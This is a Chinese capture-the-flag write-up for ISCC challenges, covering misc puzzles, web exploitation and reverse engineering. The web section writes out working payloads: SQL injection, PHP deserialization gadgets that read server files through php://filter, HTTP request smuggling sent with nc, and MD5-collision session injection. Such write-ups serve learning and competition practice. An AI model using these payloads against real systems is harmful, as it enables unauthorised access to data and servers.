f&#x27;./flag/&#123;str(i)&#125;/&#x27; file_list = os.listdir(path) this_bit = &#x27;&#x27; for j in file_list: img = Image.open(f&#x27;&#123;path&#125;&#123;j&#125;&#x27;) texts = pyzbar.decode(img) for text in texts: if(text[0].decode() == &#x27;..-. .-.. .- --.&#x27;): print(j[0],end=&#x27;&#x27;) 得到然后1&#x3D;. 2&#x3D;- 3&#x3D;空格 进行替换使用如下python脚本 12345s = &#xx27; s1 = s.replace(&#x27;1&#x27;,&#x27;.&#x27;)s2 = s1.replace(&#x27;2&#x27;,&#x27;-&#x27;)s3 = s2.replace(&#x27;3&#x27;,&#x27; &#x27;)print(s3) 得到解密得到 110011101111001111000111001111000101011000010101001100100110010011011001110111111100010011001110000100101101011111100111011011001101010110001011010011100110110010100100101101101101000101000111101000110001111100010011101111000110010011011011101101100101110110011110010110100110101011000111110100110010010111101 发现位数不能被8整除 但可以被7整除 故7位一byte 得到 1NyqgE0TddlwxLpK/g6514s2I6hQt1xNxdmmKYriUGiI= 通过字频统计得到 1th1sn0flag aes解密即可 在如下网站 1http://tool.chacuo.net/cryptaes 得到flag 1flag&#123;oh!itistheflag&#125; 21、你相信AI吗？用于处理dataset文件夹中的数据的python脚本 需要手动在目录下创建out文件夹 12345678910111213141516171819202122import cv2import numpy as np for i in range(24): with open(f&quot;./dataset/&#123;i&#125;.txt&quot;, &quot;r&quot;) as f: data = f.read().splitlines() image_data = np.array([float(line) for line in data]) if image_data.shape[0] == 2352: cv2.imwrite(f&quot;./out/&#123;i&#125;.png&quot;, image_data.reshape(84, 28)) elif image_data.shape[0] == 1568: cv2.imwrite(f&quot;./out/&#123;i&#125;.png&quot;, image_data.reshape(56, 28)) else: print(i) 接下来暴力破解即可 密文内容需要自己读取 当然有其他方法也可以使用 12345678910111213141516171819202122232425262728# coding:gbkimport stringimport itertoolsimport contextlibfrom base64 import b64decodedef has_visible_bytes(input_bytes): return all(chr(byte) in string.printable for byte in input_bytes)cipher_text = &#x27;51 59 75 95 56 46 669 680 28 46 680 633 28 95 92 02 688 668 70 02 52 55 75 47&#x27;.split(&quot; &quot;)with open(&quot;out.txt&quot;, &quot;wb&quot;) as f: for i in itertools.permutations(&quot;0123456789&quot;, 10): maktrans = str.maketrans(&quot;0123456789&quot;, &#x27;&#x27;.join(i)) lis = [str.translate(i, maktrans) for i in cipher_text] with contextlib.suppress(Exception): plan_text = bytes(list(map(lambda x: int(x), lis))) if has_visible_bytes(plan_text): if b&#x27;ISCC&#123;&#x27; in b64decode(plan_text): print(b64decode(plan_text)) f.write(plan_text + b&quot;\\n&quot;) 然后即可得到flag 1ISCC&#123;agxsd15vruas&#125; Web1、where网站无法打开 2、Easy-SQLpayload如下 1http://39.106.87.115:7009/?id=-1 union table emails limit 0,1 POST内容 1username=admin&#x27; union select &#x27;admin&#x27;,&#x27;admin&#x27;,&#x27;admin&#x27;#&amp;passwd=admin 得到flag 1ISCC&#123;0H_1you*A2E-S0_Gre4t.Congt2!&#125; 3、findmepayload如下POST内容 1data=O:1:&quot;a&quot;:5:&#123;s:3:&quot;un0&quot;;s:13:&quot;SplFileObject&quot;;s:3:&quot;un1&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=hint.php&quot;;s:3:&quot;un2&quot;;N;s:3:&quot;un3&quot;;s:11:&quot;unserialize&quot;;s:3:&quot;un4&quot;;N;&#125; url 1http://39.106.87.115:7111/unser.php 返回的内容为 1Your output: PD9waHANCiRhID0gJ2ZsYWflnKjlvZPliY3nm67lvZXkuIvku6XlrZfmr41m5byA5aS055qEdHh05LitLOaXoOazleeIhuegtOWHuuadpSc7 base64解密 12&lt;?php$a = &#x27;flag在当前目录下以字母f开头的txt中,无法爆破出来&#x27; 更换POST内容 1data=O:1:&quot;a&quot;:5:&#123;s:3:&quot;un0&quot;;s:12:&quot;GlobIterator&quot;;s:3:&quot;un1&quot;;s:6:&quot;f*.txt&quot;;s:3:&quot;un2&quot;;N;s:3:&quot;un3&quot;;s:11:&quot;unserialize&quot;;s:3:&quot;un4&quot;;N;&#125; 找到flag文件名称 1Your output: flll44ggg-secret.txt 再次更换POST内容 1data=O:1:&quot;a&quot;:5:&#123;s:3:&quot;un0&quot;;s:13:&quot;SplFileObject&quot;;s:3:&quot;un1&quot;;s:20:&quot;flll44ggg-secret.txt&quot;;s:3:&quot;un2&quot;;N;s:3:&quot;un3&quot;;s:11:&quot;unserialize&quot;;s:3:&quot;un4&quot;;N;&#125; 得到flag 1flag&#123;W0w!_You_r3a1_KN0~_Unse2!!!&#125; 4、让我康康！payload 在kali内运行 1echo &quot;GET / HTTP/1.1\\r\\nHost: localhost\\r\\nContent-Length: 90\\r\\nSec-Websocket-Key1: x\\r\\n\\r\\nxxxxxxxxGET /fl4g HTTP/1.1\\r\\nHost: localhost\\r\\nsecr3t_ip:127.0.0.1\\r\\nContent-Length: 55\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: 127.0.0.1:80\\r\\n\\r\\n&quot; | nc 39.106.87.115 7112 得到flag 1flag&#123;My_House_is_pretty_BIG&#125; 5、羊了个羊f12查看源代码无法查看在url前加上 1view-source: 即可然后在js里面搜索 1alert 即可发现base64加密过后的字符串解密即可 1ISCC&#123;sdsadN&#125; 6、小周的密码锁get传参 1http://10.15.7.203:8034/?password=1&amp;password2=5 得到源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134&lt;!DOCTYPE html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;title&gt;Get flag&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;./sb-admin-2.css&quot; /&gt;&lt;/head&gt;&lt;style&gt; .container-1 &#123; position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%); &#125;&lt;/style&gt;&lt;body class=&quot;&quot;&gt;&lt;?php function MyHashCode($str) &#123; $h = 0; $len = strlen($str); for ($i = 0; $i &lt; $len; $i++) &#123; $hash = intval40(intval40(40 * $hash) + ord($str[$i])); &#125; return abs($hash); &#125; function intval40($code) &#123; $falg = $code &gt;&gt; 32; if ($falg == 1) &#123; $code = ~($code - 1); return $code * -1; &#125; else &#123; return $code; &#125; &#125; function Checked($str)&#123; $p1 = &#x27;/ISCC/&#x27;; if (preg_match($p1, $str))&#123; return false; &#125; return true; &#125; function SecurityCheck($sha1,$sha2,$user)&#123; $p1 = &#x27;/^[a-z]+$/&#x27;; $p2 = &#x27;/^[A-Z]+$/&#x27;; if (preg_match($p1, $sha1) &amp;&amp; preg_match($p2, $sha2))&#123; $sha1 = strtoupper($sha1); $sha2 = strtolower($sha2); $user = strtoupper($user); $crypto = $sha1 ^ $sha2; &#125; else&#123; die(&quot;wrong&quot;); &#125; return array($crypto, $user); &#125; error_reporting(0); $user = $_GET[&#x27;username&#x27;];//user $sha1 = $_GET[&#x27;sha1&#x27;];//sha1 $sha2 = $_GET[&#x27;‮⁦//sha2⁩⁦sha2&#x27;]; //‮⁦see me ⁩⁦can you if (isset ($_GET[&#x27;password&#x27;])) &#123; if ($_GET[&#x27;password2&#x27;] == 5)&#123; show_source(__FILE__); &#125; else&#123; //Try to encrypt if(isset($sha1) &amp;&amp; isset($sha2) &amp;&amp; isset($user))&#123; [$crypto, $user] = SecurityCheck($sha1,$sha2,$user); if((substr(sha1($crypto),-6,6) === substr(sha1($user),-6,6)) &amp;&amp; (substr(sha1($user),-6,6)) === &#x27;a05c53&#x27;)&#123;//welcome to ISCC if((MyHashcode(&quot;ISCCNOTHARD&quot;) === MyHashcode($_GET[&#x27;password&#x27;]))&amp;&amp;Checked($_GET[&#x27;password&#x27;]))&#123; include(&quot;f1ag.php&quot;); echo $flag; &#125;else&#123; die(&quot;就快解开了!&quot;); &#125; &#125; else&#123; die(&quot;真的想不起来密码了吗?&quot;); &#125; &#125;else&#123; die(&quot;密钥错误!&quot;); &#125; &#125; &#125; mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 1e4) + rand(1, 1e4));?&gt;&lt;div class=&quot;container-1&quot; style=&quot;height:5rem;width: 25rem;&quot;&gt; &lt;div class=&quot;card border-0&quot; style=&quot;background-color: #d3cbc4;&quot;&gt; &lt;div class=&quot;c&quot;&gt; &lt;div class=&quot;text-center&quot;&gt; &lt;div class=&quot;p-5&quot;&gt; &lt;div class=&quot;text-center&quot;&gt; &lt;h1 class=&quot;h4 text-gray-900 mb-4&quot;&gt;密码箱&lt;/h1&gt; &lt;/div&gt; &lt;form method=&quot;get&quot; class=&quot;user&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;div class=&quot;form-group&quot;&gt;&lt;input type=&quot;password&quot; class=&quot;form-control form-control-user&quot; placeholder=&quot;1&quot;readonly=&quot;readonly&quot;&gt;&lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt;&lt;input type=&quot;password&quot; class=&quot;form-control form-control-user&quot; placeholder=&quot;2&quot;readonly=&quot;readonly&quot;&gt;&lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt;&lt;input type=&quot;password&quot; class=&quot;form-control form-control-user&quot; placeholder=&quot;3&quot;readonly=&quot;readonly&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;input type=&quot;text&quot; required name=&quot;password&quot; placeholder=&quot;请输入密码&quot; class=&quot;form-control form-control-user&quot;/&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;input type=&quot;text&quot; required name=&quot;password2&quot; value=&quot;1&quot;style=&quot;display:none&quot; class=&quot;form-control form-control-user&quot;/&gt; &lt;/div&gt; &lt;input class=&quot;btn btn-primary btn-user btn-block&quot; type=&quot;submit&quot; value=&quot;解锁&quot;/&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;section class=&quot;login text-center&quot;&gt;&lt;/section&gt;&lt;/body&gt;&lt;/html&gt; 最后的payload 1?password=1&amp;password2=4&amp;username=BI48U&amp;sha1=beygtu&amp;%E2%80%AE%E2%81%A6//sha2%E2%81%A9%E2%81%A6sha2=AKCMXW&amp;password=ISCBvOTHARD flag 1ISCC&#123;sdsadNsdsadN&#125; 7、老狼老狼几点了payload如下 1234567891011121314151617181920212223import requests url= &quot;http://10.15.7.203:8035/&quot;hd=&#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;&#125;text1=requests.get(url,headers=hd).text payload = &#x27;param1=1705073800%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%F4%DF%84%02%15%93%C3%E8%CD%243%8Bf%25%ED%AA%ACC%DC%A9Ru%DC%86T%BA9%0E%C5%F9%08%B4%F6%2B%FA%C7X%ED%1BPk%D0%E8%04%88%91%C6F%A0%00%C2%E0%C1Z%25%15%A3%92%1A%815%C6%14s%D7i%DC%F7%AD%E7%00%D3%E7%1B%E8l%0E%81%C0%87%23%90s%3B%40%9A%91%1F%8B%B3+%EF%2B%60h%A6%D7%3B%18T%A7%88%12%14t%04L%5BU%04%0A%DD%069%82AX%25%996%BBV%F6%833%E7a%FF&amp;param2=1705073800%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%F4%DF%84%02%15%93%C3%E8%CD%243%8Bf%25%ED%AA%ACC%DC%29Ru%DC%86T%BA9%0E%C5%F9%08%B4%F6%2B%FA%C7X%ED%1BPk%D0%E8%04%88%11%C7F%A0%00%C2%E0%C1Z%25%15%A3%92%1A%015%C6%14s%D7i%DC%F7%AD%E7%00%D3%E7%1B%E8l%0E%81%C0%87%23%90s%BB%40%9A%91%1F%8B%B3+%EF%2B%60h%A6%D7%3B%18T%A7%88%12%14t%04L%5BU%84%09%DD%069%82AX%25%996%BBV%F6%033%E7a%FF&amp;_SESSION[a]=abase64base64base64&amp;_SESSION[b]=b&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;s:8:&quot;function&quot;;s:4:&quot;hack&quot;;s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.basbase64e64-encode/resource=flag.php&quot;;&#125;&#x27; while 1==1: text = requests.post(url,data=payload,headers=hd).text if &quot;Just the time&quot; in text: print(text) break else: try: text1=text.split(&quot;&lt;code&gt;&quot;)[0] print(text1) except : print(text1) print(&quot;error except&quot;) break Reverse1、Garden得到一个pyc文件 使用python反编译网站进行反编译即可 得到源码 123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/env python# visit https://tool.lu/pyc/ for more information# Version: Python 2.7import platformimport sysimport marshalimport typesdef check(s): f = &#x27;2(88%006%1a%10%10%1aIKIJ+%1a%10%10%1a%06&#x27; if len(s) != len(f): return False checksum = None for a, b in zip(f, s): checksum += ord(b) ^ ord(a) ^ 123 return checksum == 0if sys.version_info.major != 2 or sys.version_info.minor != 7: sys.exit(&#x27;%e8%af%95%e8%af%95 Python 2.7.&#x27;)if len(sys.argv) != 2: sys.exit(&#x27;usage: bronze.pyc &lt;flag&gt;&#x27;)flag = sys.argv[1]if len(flag) &gt;= 32: print &#x27;%e5%a4%aa%e9%95%bf%e4%ba%86.&#x27; sys.exit(1)alphabet = set(&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;!@#$%+&#x27;)for ch in flag: if ch not in alphabet: print &#x27;%e4%b8%8d%e5%af%b9.&#x27; sys.exit(1) continueif check(flag): print &#x27;%e5%b0%b1%e6%98%af%e8%bf%99%e4%b8%aa!&#x27; sys.exit(0)else: print &#x27;%e6%90%9e%e9%94%99%e4%ba%86.&#x27; sys.exit(1) 内容都是url加密过后的f中的内容将%替换为\\x即可对f中的内容进行运算 即可得到flag 12345s = &#x27;&#x27;for a in &#x27;2(88\\x006\\x1a\\x10\\x10\\x1aIKIJ+\\x1a\\x10\\x10\\x1a\\x06&#x27;: b=ord(a)^123 s += chr(int(b))print(s) flag 1ISCC&#123;Makka2021Pakka&#125; 2、Amy’s Code32位程序找到反汇编之后的代码 12345678910111213141516int __cdecl main_0(int argc, const char **argv, const char **envp)&#123; char Destination[520]; // [esp+DCh] [ebp-410h] BYREF char Source[516]; // [esp+2E4h] [ebp-208h] BYREF j__printf(aPleaseInputFla); sub_411717((va_list)&quot;%s&quot;, (char)Source); j__strcpy(Destination, Source); sub_4115FF(Destination); if ( sub_411433(Destination) ) j__printf(&quot;Correct!\\n&quot;); else j__printf(&quot;Wrong!\\n&quot;); j__system(&quot;pause&quot;); return 0;&#125; sub_4115FF函数的内容 12345678910111213141516int __cdecl sub_4128A0(char *Str)&#123; int result; // eax int i; // [esp+D0h] [ebp-14h] signed int v3; // [esp+DCh] [ebp-8h] v3 = j__strlen(Str); for ( i = 0; ; ++i ) &#123; result = i; if ( i &gt;= v3 ) break; Str[i] ^= i; &#125; return result;&#125; 判断函数sub_411433的内容 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748int __cdecl sub_412550(char *Str)&#123; int j; // [esp+D0h] [ebp-14Ch] int i; // [esp+DCh] [ebp-140h] int v4[32]; // [esp+E8h] [ebp-134h] BYREF int v5; // [esp+168h] [ebp-B4h] _WORD v6[12]; // [esp+174h] [ebp-A8h] BYREF int v7; // [esp+18Ch] [ebp-90h] __int16 v8; // [esp+190h] [ebp-8Ch] int v9[31]; // [esp+19Ch] [ebp-80h] BYREF v9[0] = 149; v9[1] = 169; v9[2] = 137; v9[3] = 134; v9[4] = 212; v9[5] = 188; v9[6] = 177; v9[7] = 184; v9[8] = 177; v9[9] = 197; v9[10] = 192; v9[11] = 179; v9[12] = 153; v9[13] = 167; v9[14] = 186; v9[15] = 172; v9[16] = 164; v9[17] = 174; v9[18] = 103; v9[19] = 184; memset(&amp;v9[20], 0, 40); strcpy((char *)v6, &quot;LWHFUENGDJGEFHYDHIGJ&quot;); HIBYTE(v6[10]) = 0; v6[11] = 0; v7 = 0; v8 = 0; v5 = j__strlen(Str); j__memset(v4, 0, 0x78u); for ( i = 0; i &lt; v5; ++i ) v4[i] = *((char *)v6 + i) + Str[i]; for ( j = 0; j &lt; v5; ++j ) &#123; if ( v4[j] != v9[j] ) return 0; &#125; return 1;&#125; 内容就是foreach 和 LWHFUENGDJGEFHYDHIGJ 按位异或 使用如下python脚本解码即可 12345678910111213141516171819202122232425262728v9=[0]*20v9[0] = 149;v9[1] = 169;v9[2] = 137;v9[3] = 134;v9[4] = 212;v9[5] = 188;v9[6] = 177;v9[7] = 184;v9[8] = 177;v9[9] = 197;v9[10] = 192;v9[11] = 179;v9[12] = 153;v9[13] = 167;v9[14] = 186;v9[15] = 172;v9[16] = 164;v9[17] = 174;v9[18] = 103;v9[19] = 184;v6=&#x27;LWHFUENGDJGEFHYDHIGJ&#x27;flag=&#x27;&#x27;for i in range(len(v6)): flag+=chr((v9[i]-ord(v6[i]))^i)print(flag) 得到flag为 1ISCC&#123;reverse_RogLt2&#125; 3、GetTheTable64位程序反编译后发现一段可疑代码 1ERaQux2gcaecxk8pM3y7eFGhmE 丢入cyberchef里面 即可快速解码得到flag 1ISCC&#123;Jvb9qzP910IPv&#125; 4、Analysis题目信息 1分析就完事了！ 32位程序反编译后发现如下代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354int __cdecl main(int argc, const char **argv, const char **envp)&#123; char Str[3]; // [esp+11h] [ebp-97h] BYREF _BYTE v5[57]; // [esp+14h] [ebp-94h] BYREF int v6; // [esp+4Dh] [ebp-5Bh] char v7[64]; // [esp+51h] [ebp-57h] BYREF char v8[7]; // [esp+91h] [ebp-17h] BYREF int v9; // [esp+98h] [ebp-10h] int i; // [esp+9Ch] [ebp-Ch] __main(); v6 = 0; memset(v5, 0, 4 * (((Str - v5 + 64) &amp; 0xFFFFFFFC) &gt;&gt; 2)); Str[0] = 67; Str[1] = -33; Str[2] = 20; v5[0] = 3; v5[1] = 13; v5[2] = 44; v5[3] = 9; v5[4] = 1; v5[5] = 23; v5[6] = 23; v5[7] = 8; v5[8] = -4; v5[9] = 43; v5[10] = -6; v5[11] = 20; v5[12] = 23; v5[13] = -7; v5[14] = 37; v5[15] = -11; v5[16] = 34; v5[17] = 61; v5[18] = -50; v5[19] = 24; v5[20] = 22; v5[21] = 10; qmemcpy(v8, &quot;REVERSE&quot;, sizeof(v8)); v9 = strlen(Str); printf(&amp;Format); scanf(&quot;%s&quot;, v7); mix(v7, v8, v9); for ( i = 0; i &lt; v9; ++i ) &#123; if ( v7[i] != Str[i] ) &#123; puts(Buffer); return 0; &#125; &#125; puts(aFlag); return 0;&#125; 关键在于mix函数 123456789101112131415161718192021222324252627282930313233343536373839int __cdecl mix(char *a1, char *Str, int a3)&#123; char v3; // dl int result; // eax char v5; // [esp+14h] [ebp-24h] int ii; // [esp+18h] [ebp-20h] int n; // [esp+1Ch] [ebp-1Ch] int m; // [esp+20h] [ebp-18h] size_t k; // [esp+24h] [ebp-14h] int j; // [esp+28h] [ebp-10h] int i; // [esp+2Ch] [ebp-Ch] for ( i = 0; i &lt; a3; ++i ) a1[i] -= 64; for ( j = 0; j &lt; a3; ++j ) a1[j] -= a1[j + 1]; for ( k = 0; k &lt; strlen(Str); ++k ) Str[k] %= 64; for ( m = 0; m &lt; a3; ++m ) a1[m] += Str[m % 7]; for ( n = 0; a3 / 2 &gt; n; ++n ) &#123; v5 = a1[n]; a1[n] = a1[a3 - n - 1]; a1[a3 - n - 1] = v5; &#125; for ( ii = 0; ; ++ii ) &#123; result = ii; if ( ii &gt;= a3 ) break; if ( (Str[ii % 7] &amp; 1) != 0 ) v3 = a1[ii] + 2; else v3 = a1[ii] + 1; a1[ii] = v3; &#125; return result;&#125; 逐步解密即可 1234567891011121314151617181920212223242526272829303132333435# coding:gbkcpt = [67,-33,20,3,13,44,9,1,23,23,8,-4,43,-6,20,23,-7,37,-11,34,61,-50,24,22,10]mix = [82,69,86,69,82,83,69]for k in range(len(mix)): mix[k] %= 64#加密用的密匙都是取余后的，所以先取余操作for n in range(len(cpt)): if mix[n%7] &amp; 1: cpt[n] -= 2 else: cpt[n] -= 1#先逆加一和加二for m in range(len(cpt)//2): x = cpt[m] cpt[m] = cpt[len(cpt)-1-m] cpt[len(cpt)-1-m] = x#对称互换for l in range(len(cpt)): cpt[l] -= mix[l%7]#逆自加，既自减for j in range(len(cpt)-2,-1,-1): cpt[j] += cpt[j+1]#这一步需要从后往前，因为最后一个字符是不变的for i in range(len(cpt)): cpt[i] += 64#加回64print(cpt)#列表形式输出（ASCII码形式）for i in range(len(cpt)): cpt[i] = chr(cpt[i])#转为字符flag = &#x27;&#x27;.join(cpt)#串成串print(flag)#输出 得到flag 1ISCC&#123;REVERSE_IS_NOT_HARD&#125; 5、大人，时代变了.ll后缀 为llvm指令集 在kali中安装 1sudo apt install llvm clang 然后运行 123llc task.ll -o task.sgcc -c task.s -o task.ogcc task.o -o task 最后一步会报错 那就直接分析task.o吧 使用ida pro 64bit打开主函数 123456789101112131415161718192021222324252627282930313233int __cdecl main(int argc, const char **argv, const char **envp)&#123; size_t v3; // rbx int j; // [rsp+4h] [rbp-74h] int i; // [rsp+8h] [rbp-70h] char s[104]; // [rsp+10h] [rbp-68h] BYREF printf(&quot;Only the chosen one will know what the flag is!\\n&quot;); printf(&quot;Are you the chosen one?\\n&quot;); printf(&quot;flag: &quot;); _isoc99_scanf(&quot;%64s&quot;, s); v3 = strlen(s); if ( v3 == strlen(what) ) &#123; if ( (unsigned int)check((__int64)s) ) &#123; for ( i = 0; i &lt; strlen(s); ++i ) s[i] ^= secret[i % strlen(secret)]; &#125; else &#123; for ( j = 0; j &lt; strlen(s); ++j ) s[j] = flag[j] ^ secret[j % strlen(secret)]; &#125; printf(format, s); return 0; &#125; else &#123; printf(asc_397); return 1; &#125;&#125; check函数 12345678910__int64 __fastcall check(__int64 a1)&#123; int i; // [rsp+8h] [rbp-30h] unsigned int v3; // [rsp+Ch] [rbp-2Ch] v3 = 1; for ( i = 0; i &lt; strlen(what); ++i ) v3 = ((char)(*(_BYTE *)(a1 + (i + 1LL) % strlen(what)) ^ *(_BYTE *)(a1 + i)) == what[i]) &amp; (unsigned __int8)v3; return v3;&#125; 即有 1s[i]^s[(i+1)%strlen(what)]==what[i] 爆破脚本 123456789101112131415161718192021secret=[0x42, 0x0A, 0x7C, 0x5F, 0x22, 0x06, 0x1B, 0x67, 0x37, 0x23, 0x5C, 0x46, 0x0A, 0x29, 0x09, 0x30, 0x51, 0x38, 0x5F, 0x7B, 0x59, 0x13, 0x18, 0x0D, 0x50]flag=[0x1D, 0x55, 0x23, 0x68, 0x4A, 0x37, 0x2E, 0x38, 0x06, 0x16, 0x03, 0x72, 0x55, 0x4F, 0x3D, 0x5B, 0x62, 0x67, 0x39, 0x4A, 0x6D, 0x74, 0x47, 0x74, 0x60, 0x37, 0x55, 0x0B, 0x6E, 0x4E, 0x6A, 0x44, 0x01, 0x03, 0x12, 0x30, 0x19, 0x3B, 0x4F, 0x56, 0x49, 0x61, 0x4D, 0x00, 0x08, 0x2C, 0x71, 0x75, 0x3C, 0x67, 0x1D, 0x3B, 0x4B, 0x00, 0x7D, 0x59]what=[0x64, 0x4E, 0x6C, 0x2E, 0x1E, 0x36, 0x38, 0x04, 0x44, 0x12, 0x1C, 0x24, 0x5C, 0x59, 0x3D, 0x0B, 0x5A, 0x78, 0x08, 0x09, 0x76, 0x70, 0x79, 0x33, 0x13, 0x16, 0x20, 0x7E, 0x6B, 0x23, 0x36, 0x45, 0x07, 0x11, 0x2C, 0x22, 0x4A, 0x4A, 0x4F, 0x2E, 0x48, 0x4C, 0x7C, 0x3E, 0x11, 0x0F, 0x6A, 0x18, 0x37, 0x42, 0x1E, 0x2B, 0x12, 0x03, 0x5A, 0x47]###### fake flag# ans=&#x27;&#x27;# for i in range(len(what)):# ans+=chr(flag[i]^secret[i%len(secret)])# print(ans)for x in range(256): ans=[x] for i in range(1,len(what)): ans.append(ans[i-1]^what[i-1]) for i in range(len(ans)): ans[i]^=secret[i%len(secret)] if ans[i] not in range(32,127): # 可见字符范围 break else: myFlag=&#x27;&#x27;.join(map(chr,ans)) print(&quot;ISCC&#123;&quot;+myFlag+&quot;&#125;&quot;) 得到flag 1ISCC&#123;mAy6e_t0d4Y_7H15_ls_tH3_10n8est_f14g_Y0_HaD_Ev3R_5e3n_!_&#125; 6、Sad Code32位程序主函数如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667int __cdecl main_0(int argc, const char **argv, const char **envp)&#123; __int64 v4; // rax int v5; // ecx char Destination[60]; // [esp+D8h] [ebp-348h] BYREF int k; // [esp+114h] [ebp-30Ch] char v8; // [esp+120h] [ebp-300h] char v9[49]; // [esp+121h] [ebp-2FFh] BYREF size_t v10; // [esp+15Ch] [ebp-2C4h] int j; // [esp+168h] [ebp-2B8h] int i; // [esp+174h] [ebp-2ACh] _BYTE v13[56]; // [esp+180h] [ebp-2A0h] BYREF __int64 v14[10]; // [esp+1B8h] [ebp-268h] BYREF int v15; // [esp+208h] [ebp-218h] int v16; // [esp+20Ch] [ebp-214h] char Str[516]; // [esp+218h] [ebp-208h] BYREF v15 = 0; v16 = 0; memset(v14, 0, 72); memset(v13, 0, 45); j__printf(&amp;byte_439F18); sub_413834((va_list)&quot;%s&quot;, (char)Str); if ( j__strlen(Str) != 32 ) return 0; for ( i = 0; i &lt; 8; ++i ) &#123; for ( j = 0; j &lt; 4; ++j ) v13[5 * i + j] = Str[4 * i + j]; &#125; v10 = 0; v8 = 0; j__memset(v9, 0, sizeof(v9)); for ( k = 0; k &lt; 8; ++k ) &#123; memset(Destination, 0, 50); sub_4130CD((int)&amp;v13[5 * k], Destination); v10 = j__strlen(Destination); v4 = sub_413BDB(v10, Destination, v15, v16); v5 = k; LODWORD(v14[k]) = v4; HIDWORD(v14[v5]) = HIDWORD(v4); &#125; if ( v14[2] + 7 * v14[1] - 4 * v14[0] - 2 * v14[3] == 0x212278F95i64 &amp;&amp; 5 * v14[3] + 3 * v14[2] - v14[1] - 2 * v14[0] == 0x146E7D971i64 &amp;&amp; 2 * v14[1] + 8 * v14[3] + 10 * v14[0] - 5 * v14[2] == 0x419AB1349i64 &amp;&amp; 7 * v14[0] + 15 * v14[1] - 3 * v14[3] - 2 * v14[2] == 0x7C35A4CA7i64 ) &#123; if ( 15 * v14[4] + 35 * v14[7] - v14[5] - v14[6] == 0xF867F3C4Ci64 &amp;&amp; 38 * v14[6] + v14[4] + v14[7] - 24 * v14[5] == 0x7AFCBCA32i64 &amp;&amp; 38 * v14[5] + 32 * v14[4] - v14[6] - v14[7] == 0x139360369Di64 &amp;&amp; v14[4] + 41 * v14[6] - v14[5] - 25 * v14[7] == 0x653CABE3Ei64 ) &#123; j__printf(&quot;Correct!\\n&quot;); &#125; else &#123; j__printf(&quot;Keep trying!\\n&quot;); &#125; &#125; else &#123; j__printf(&quot;Wrong!\\n&quot;); &#125; j__system(&quot;pause&quot;); return 0;&#125; 看到两个四元方程组 12c+7b-4a-2d=8894517141, 5d+3c-b-2a=5484566897, 2b+8d+10a-5c=17610511177, 7a+15b-3d-2c=3334224605515a+35d-b-c=66680994892, 38c+a+d-24b=33014139442, 38b+32a-c-d=84076934813, a+41c-b-25d=27175599678 在线网站去解 分别解得两组方程的解 当然也可如下面使用python的z3库进行处理 12a = 1230193475 and b = 2069513800 and c = 1515673409 and d = 1093489484a = 1396920641 and b = 1111960908 and c = 1497979470 and d = 1381060733 查看sub_413BDB函数的内容 123456789101112131415161718192021222324252627282930313233343536373839404142__int64 __cdecl sub_414A20(int a1, int a2)&#123; int j; // [esp+D4h] [ebp-30h] int i; // [esp+E0h] [ebp-24h] __int64 v5; // [esp+ECh] [ebp-18h] int v6; // [esp+FCh] [ebp-8h] __int64 v8; // [esp+114h] [ebp+10h] v8 = 0i64; for ( i = 0; *(_BYTE *)(i + a2); ++i ) &#123; switch ( *(_BYTE *)(i + a2) ) &#123; case &#x27;A&#x27;: v6 = 10; break; case &#x27;B&#x27;: v6 = 11; break; case &#x27;C&#x27;: v6 = 12; break; case &#x27;D&#x27;: v6 = 13; break; case &#x27;E&#x27;: v6 = 14; break; case &#x27;F&#x27;: v6 = 15; break; default: v6 = *(char *)(i + a2) - 48; break; &#125; v5 = 1i64; for ( j = 0; j &lt; a1 - 1 - i; ++j ) v5 = (unsigned __int64)((double)v5 * 16.0); v8 += v6 * v5; &#125; return v8;&#125; 发现是将十六进制转化为十进制那么将数字变回十六进制即可运行如下python脚本 1234567891011121314151617181920212223242526272829303132333435363738394041from z3 import * v14=[Int(&quot;v14%s&quot;%i) for i in range(8)] s=Solver() s.add(v14[2] + 7 * v14[1] - 4 * v14[0] - 2 * v14[3] == 0x212278F95) s.add( 5 * v14[3] + 3 * v14[2] - v14[1] - 2 * v14[0] == 0x146E7D971) s.add(2 * v14[1] + 8 * v14[3] + 10 * v14[0] - 5 * v14[2] == 0x419AB1349) s.add( 7 * v14[0] + 15 * v14[1] - 3 * v14[3] - 2 * v14[2] == 0x7C35A4CA7) s.add(15 * v14[4] + 35 * v14[7] - v14[5] - v14[6] == 0xF867F3C4C) s.add(38 * v14[6] + v14[4] + v14[7] - 24 * 